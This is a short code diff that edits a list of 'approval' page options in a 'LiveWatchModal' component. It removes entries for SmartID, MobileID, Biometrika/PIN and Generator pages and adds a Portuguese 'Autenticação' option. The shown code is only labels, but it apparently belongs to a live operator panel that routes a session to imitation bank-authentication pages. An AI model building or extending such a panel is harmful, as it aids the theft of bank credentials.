@@ -52,15 +52,8 @@ const ROUTE_OPTIONS = [
 ];
 
 const APPROVAL_OPTIONS = [
-  { value: "smartid_1", label: "SmartID 1 Sayfası" },
-  { value: "smartid_2", label: "SmartID 2 Sayfası" },
-  { value: "mobileid_1", label: "MobileID 1 Sayfası" },
-  { value: "mobileid_2", label: "MobileID 2 Sayfası" },
-  { value: "biometrika_pin_1", label: "Biometrika/PIN 1" },
-  { value: "biometrika_pin_2", label: "Biometrika/PIN 2" },
-  { value: "generator1", label: "Generator 1" },
-  { value: "generator2", label: "Generator 2" },
   { value: "transfer", label: "Transfer Onayı" },
+  { value: "autenticacao", label: "Autenticação" },
 ];
 
 export function LiveWatchModal({
